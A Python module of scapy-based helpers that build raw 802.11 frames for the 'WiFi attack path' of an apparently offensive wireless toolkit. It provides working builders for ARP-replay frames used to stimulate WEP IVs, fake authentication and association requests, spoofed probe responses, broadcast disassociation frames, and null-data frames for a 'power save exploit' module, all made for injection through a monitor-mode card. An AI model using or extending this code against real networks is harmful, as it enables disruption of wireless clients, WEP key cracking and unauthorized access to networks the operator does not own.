"""802.11 frame-crafting helpers for the WiFi attack path.

These build the frame types the historical ``wifi_offensive_ai/wifite4/
packet_injection.py`` facade referenced but never implemented:
``craft_arp_frame``, ``craft_probe_response``, ``craft_auth_frame``,
``craft_assoc_req_frame``. They complement
:mod:`core.modules.mt7921e_tools` (``craft_deauth_frame`` /
``craft_fakeauth_frame`` / ``craft_beacon_frame`` / ``craft_cts_frame``)
and share the same contract:

    {"ok": True, "frame": bytes}            # built
    {"ok": False, "error": "scapy not installed"}        # scapy missing
    {"ok": False, "error": "scapy layer unavailable"}    # specific layer
    {"ok": False, "error": "<build error>"}              # any build failure

Every helper never raises — callers (e.g. the mt7921e ``inject(mode=...)``
scapy-first paths) fall back to aireplay-ng when a frame can't be built.
All frames use a ``RadioTap()`` header so they are ready for
``mt7921e_tools.inject_raw_frame(iface, frame)``.
"""
from typing import Any, Dict, Optional


def craft_arp_frame(bssid: str, station: str,
                    src_ip: str = "0.0.0.0", dst_ip: str = "255.255.255.255",
                    src_mac: Optional[str] = None) -> Dict[str, Any]:
    """Build a raw 802.11 data frame carrying an ARP request (the classic
    arp_replay / WEP-IV-stimulation payload).

    Frame shape:
    ``RadioTap()/Dot11(type=2, subtype=0, addr1=bssid, addr2=station,
    addr3=bssid)/LLC()/SNAP(OUI=0x000000, code=0x0806)/ARP(op=1, hwsrc=
    station, psrc=src_ip, hwdst="00:00:00:00:00:00", pdst=dst_ip)``.

    ``src_mac`` is accepted for call-site symmetry and defaults to
    ``station``. Same return contract as
    :func:`core.modules.mt7921e_tools.craft_deauth_frame`. Never raises.
    """
    try:
        from scapy.all import RadioTap, Dot11  # type: ignore
    except Exception:  # noqa: BLE001 — scapy may be missing
        return {"ok": False, "error": "scapy not installed"}
    try:
        from scapy.all import LLC, SNAP, ARP  # type: ignore
    except Exception:  # noqa: BLE001 — layers may be unavailable
        return {"ok": False, "error": "scapy layer unavailable"}
    try:
        arp = ARP(op=1)
        arp.hwsrc = src_mac or station
        arp.psrc = src_ip
        arp.hwdst = "00:00:00:00:00:00"
        arp.pdst = dst_ip
        frame = (
            RadioTap()
            / Dot11(type=2, subtype=0,
                    addr1=bssid, addr2=station, addr3=bssid)
            / LLC()
            / SNAP(OUI=0x000000, code=0x0806)
            / arp
        )
        return {"ok": True, "frame": bytes(frame)}
    except Exception as e:  # noqa: BLE001 — never raise on frame build
        return {"ok": False, "error": str(e)}


def craft_probe_response(bssid: str, station: str, ssid: str = "hidden",
                         channel: int = 6) -> Dict[str, Any]:
    """Build a raw 802.11 probe-response frame via scapy.

    ``RadioTap()/Dot11(type=0, subtype=5, addr1=station, addr2=bssid,
    addr3=bssid)/Dot11Elt(SSID)/Dot11Elt(DSset=channel)``.

    Scapy 2.7.0's ``Dot11ProbeResp`` no longer accepts ``addr1/2/3``
    directly — addresses must live on the parent ``Dot11`` layer. We
    build with that pattern (works on scapy 2.4.x and 2.7.x).

    Same return contract as :func:`craft_arp_frame`. Never raises.
    """
    try:
        from scapy.all import RadioTap, Dot11  # type: ignore
    except Exception:  # noqa: BLE001 — scapy may be missing
        return {"ok": False, "error": "scapy not installed"}
    try:
        from scapy.all import Dot11Elt  # type: ignore
    except Exception:  # noqa: BLE001 — layer may be unavailable
        return {"ok": False, "error": "scapy layer unavailable"}
    try:
        frame = (
            RadioTap()
            / Dot11(type=0, subtype=5,
                    addr1=station, addr2=bssid, addr3=bssid)
            / Dot11Elt(ID="SSID", info=ssid.encode("utf-8", "replace"))
            / Dot11Elt(ID="DSset", info=bytes([int(channel) & 0xFF]))
        )
        return {"ok": True, "frame": bytes(frame)}
    except Exception as e:  # noqa: BLE001 — never raise on frame build
        return {"ok": False, "error": str(e)}


def craft_auth_frame(bssid: str, station: str,
                     seqnum: int = 1, status: int = 0) -> Dict[str, Any]:
    """Build a raw 802.11 open-system authentication-request frame via scapy.

    ``RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=station,
    addr3=bssid)/Dot11Auth(seqnum=seqnum, status=status)``.

    This is the same frame ``mt7921e_tools.craft_fakeauth_frame`` builds
    (the facade-compatible name ``craft_auth_frame`` is kept so callers
    ported from the deleted wifite4 facade resolve to a real builder).
    Same return contract as :func:`craft_arp_frame`. Never raises.
    """
    try:
        from scapy.all import RadioTap, Dot11  # type: ignore
    except Exception:  # noqa: BLE001 — scapy may be missing
        return {"ok": False, "error": "scapy not installed"}
    try:
        from scapy.all import Dot11Auth  # type: ignore
    except Exception:  # noqa: BLE001 — layer may be unavailable
        return {"ok": False, "error": "scapy layer unavailable"}
    try:
        frame = (
            RadioTap()
            / Dot11(addr1=bssid, addr2=station, addr3=bssid,
                    type=0, subtype=11)
            / Dot11Auth(seqnum=int(seqnum), status=int(status))
        )
        return {"ok": True, "frame": bytes(frame)}
    except Exception as e:  # noqa: BLE001 — never raise on frame build
        return {"ok": False, "error": str(e)}


def craft_assoc_req_frame(bssid: str, station: str, ssid: str = "hidden",
                           channel: int = 6) -> Dict[str, Any]:
    """Build a raw 802.11 association-request frame via scapy.

    ``RadioTap()/Dot11(type=0, subtype=0, addr1=bssid, addr2=station,
    addr3=bssid)/Dot11Elt(SSID)/Dot11Elt(DSset=channel)``.

    Same return contract as :func:`craft_arp_frame`. Never raises.
    """
    try:
        from scapy.all import RadioTap, Dot11  # type: ignore
    except Exception:  # noqa: BLE001 — scapy may be missing
        return {"ok": False, "error": "scapy not installed"}
    try:
        from scapy.all import Dot11Elt  # type: ignore
    except Exception:  # noqa: BLE001 — layer may be unavailable
        return {"ok": False, "error": "scapy layer unavailable"}
    try:
        frame = (
            RadioTap()
            / Dot11(type=0, subtype=0,
                    addr1=bssid, addr2=station, addr3=bssid)
            / Dot11Elt(ID="SSID", info=ssid.encode("utf-8", "replace"))
            / Dot11Elt(ID="DSset", info=bytes([int(channel) & 0xFF]))
        )
        return {"ok": True, "frame": bytes(frame)}
    except Exception as e:  # noqa: BLE001 — never raise on frame build
        return {"ok": False, "error": str(e)}


def craft_disassoc_frame(bssid: str, station: str = "FF:FF:FF:FF:FF:FF",
                         reason: int = 7) -> Dict[str, Any]:
    """Build a raw 802.11 disassociation frame via scapy.

    ``RadioTap()/Dot11(type=0, subtype=10, addr1=station, addr2=bssid,
    addr3=bssid)/Dot11Disas(reason=reason)``. Used by the
    ``disassociation_frame`` wifi_attack module (distinct from the deauth
    frame in :mod:`core.modules.mt7921e_tools`). Same return contract as
    :func:`craft_arp_frame`. Never raises.
    """
    try:
        from scapy.all import RadioTap, Dot11  # type: ignore
    except Exception:  # noqa: BLE001 — scapy may be missing
        return {"ok": False, "error": "scapy not installed"}
    try:
        from scapy.all import Dot11Disas  # type: ignore
    except Exception:  # noqa: BLE001 — layer may be unavailable
        return {"ok": False, "error": "scapy layer unavailable"}
    try:
        frame = (
            RadioTap()
            / Dot11(type=0, subtype=10,
                    addr1=station, addr2=bssid, addr3=bssid)
            / Dot11Disas(reason=int(reason) & 0xFFFF)
        )
        return {"ok": True, "frame": bytes(frame)}
    except Exception as e:  # noqa: BLE001 — never raise on frame build
        return {"ok": False, "error": str(e)}


def craft_null_data_frame(bssid: str, station: str,
                          power_save: bool = True,
                          more_data: bool = False) -> Dict[str, Any]:
    """Build a raw 802.11 null-function (type=2, subtype=4) data frame via
    scapy, with the power-save + more-data bits set per args. Used by the
    ``client_power_save_exploit`` wifi_attack module to manipulate AP power-
    save buffering state. Same return contract as :func:`craft_arp_frame`.
    Never raises.
    """
    try:
        from scapy.all import RadioTap, Dot11  # type: ignore
    except Exception:  # noqa: BLE001 — scapy may be missing
        return {"ok": False, "error": "scapy not installed"}
    try:
        # subtype=4 is the null-function data frame (type=2). The
        # power-save + more-data bits live in FCfield; set them
        # explicitly so the frame actually carries the bits the AP
        # keys its power-save buffering state off.
        #
        # Scapy 2.4.x used ``"PWR"`` as the flag name; scapy 2.5+
        # renamed it to ``"pw_mgt"`` (the IEEE 802.11 spec term). The
        # literal ``"MD"`` is unchanged. The legacy ``"PWR"`` token
        # silently raises ``ValueError: 'PWR' is not in list`` in
        # scapy 2.7.0, so we use the 2.5+ names — older scapy was
        # already deprecated before KFIOSA's first release.
        frame = (
            RadioTap()
            / Dot11(type=2, subtype=4,
                    addr1=bssid, addr2=station, addr3=bssid, SC=0)
        )
        fc = []
        if power_save:
            fc.append("pw_mgt")
        if more_data:
            fc.append("MD")
        if fc:
            frame[Dot11].FCfield = " ".join(fc)
        return {"ok": True, "frame": bytes(frame)}
    except Exception as e:  # noqa: BLE001 — never raise on frame build
        return {"ok": False, "error": str(e)}